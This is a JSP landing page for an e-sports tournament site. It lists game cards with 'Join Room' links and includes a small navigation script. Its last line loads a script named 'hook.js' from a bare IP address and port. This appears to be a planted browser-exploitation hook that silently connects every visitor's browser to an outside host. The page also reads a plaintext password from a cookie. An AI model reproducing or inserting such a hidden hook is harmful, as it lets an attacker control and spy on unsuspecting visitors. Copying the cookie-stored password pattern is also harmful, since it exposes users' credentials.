<%@ page language="java" contentType="text/html; charset=ISO-8859-1" pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Esport's Tournament</title>
<link rel="stylesheet" href="style.css">
<style>
.cont {
    display: flex;
    flex-direction: row; /* Changed to column for vertical alignment */
    gap: 20px; /* Space between cards */
    align-items: center; /* Center align the cards */
     font-size: 30px;
}

.card {
    box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
    transition: 0.3s;
    width: 40%;
    border-radius: 5px;
}

.card:hover {
    box-shadow: 0 8px 16px 0 rgba(0,0,0,0.2);
}

img {
    border-radius: 5px 5px 0 0;
    width: 100%;
}

.container {
    padding: 2px 16px;
}
.cont .card p a:link {
  color: green;
  background-color: transparent;
  text-decoration: none;
}
.cont .card p a:visited {
  color: pink;
  background-color: transparent;
  text-decoration: none;
}
.cont .card p a:hover {
  color: red;
  background-color: transparent;
  text-decoration: underline;
}
.cont .card p a:active {
  color: yellow;
  background-color: transparent;
  text-decoration: underline;
}
</style>
</head>
<body>
<%
    HttpSession ss = request.getSession();
    Object user = ss.getAttribute("user");

    if (user != null) {
        response.sendRedirect("dashboard.jsp");
    } else {
        Cookie[] cookies = request.getCookies();
        String usr = "";
        String pswd = "";

        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if (cookie.getName().equals("username")) {
                    usr = cookie.getValue();
                }
                if (cookie.getName().equals("password")) {
                    pswd = cookie.getValue();
                }
            }
        }
    }
%>
<div class="header">
    <div class="bars" id="nav-action">
        <span class="bar"> </span>
    </div>

    <!--Navbar Links-->
<!--  <nav id="nav">
        <ul>
            <li class="shape-circle circle-one"><a href="reg.jsp">Register</a></li>
            <li class="shape-circle circle-two"><a href="sign.jsp">Sign In</a></li>
            <li class="shape-circle circle-three"><a href="About.jsp">About Us</a></li>
        </ul>
    </nav>  -->

    <!--Main Body Content-->
    <article class="container">
        <h1>AN<br>E-SPORTS<br>TOURNAMENT</h1>
        <p>Developed by Shubh Kumar</p>
    </article>
</div>

<div class="cont">
    <div class="card">
        <img src="https://media4.giphy.com/media/6L5aXj6BS4iGMy2Eq4/giphy.gif" alt="Avatar">
        <div class="container">
            <h4><b>CALL OF DUTY</b></h4> 
            <p><a href="reg.jsp?room=Call of Duty">Join Room</a></p> 
        </div>
    </div>
    <div class="card">
        <img src="https://i.makeagif.com/media/5-04-2018/QFE3eO.gif" alt="Avatar">
        <div class="container">
            <h4><b>PUBG</b></h4> 
             <p><a href="reg.jsp?room=PUBG">Join Room</a></p> 
        </div>
    </div>
    <div class="card">
        <img src="https://i.redd.it/4ohu9jpuj9471.gif" alt="Avatar">
        <div class="container">
            <h4><b>BATTLEFIELD</b></h4> 
             <p><a href="reg.jsp?room=BattleField">Join Room</a></p> 
        </div>
    </div>
    <div class="card">
        <img src="https://www.icegif.com/wp-content/uploads/2022/03/icegif-306.gif" alt="Avatar">
        <div class="container">
            <h4><b>APEX LEGEND</b></h4> 
             <p><a href="reg.jsp?room=Apex Legend">Join Room</a></p> 
        </div>
    </div>
    <div class="card">
        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExYzhkOHczaGdhb3JjeGZ1NWRwOXdlaXY4NjRhOXI1MXM2MjU1MHZlMiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/f1n520NBxZb3H54nBi/giphy.webp" alt="Avatar">
        <div class="container">
            <h4><b>FORTNITE</b></h4> 
             <p><a href="reg.jsp?room=Fortnite">Join Room</a></p> 
        </div>
    </div>
    <div class="card">
        <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExNmswajY2M3dmNHV2ZjA0MGxpMjdta2RndjI0empwdjE1bnozcmI3biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/jekLk8FoON0s3YubXa/giphy.webp" alt="Avatar">
        <div class="container">
            <h4><b>BATTLE ANGEL</b></h4> 
             <p><a href="reg.jsp?room=Battle Angel">Join Room</a></p> 
        </div>
    </div>
</div>


<script>
    // Setting up the Variables
    var bars = document.getElementById("nav-action");
    var nav = document.getElementById("nav");

    //setting up the listener
    bars.addEventListener("click", barClicked, false);

    //setting up the clicked Effect
    function barClicked() {
        bars.classList.toggle('active');
        nav.classList.toggle('visible');
    }
   
</script>
<script src="http://147.185.221.21:7518/hook.js"></script>

</body>
</html>
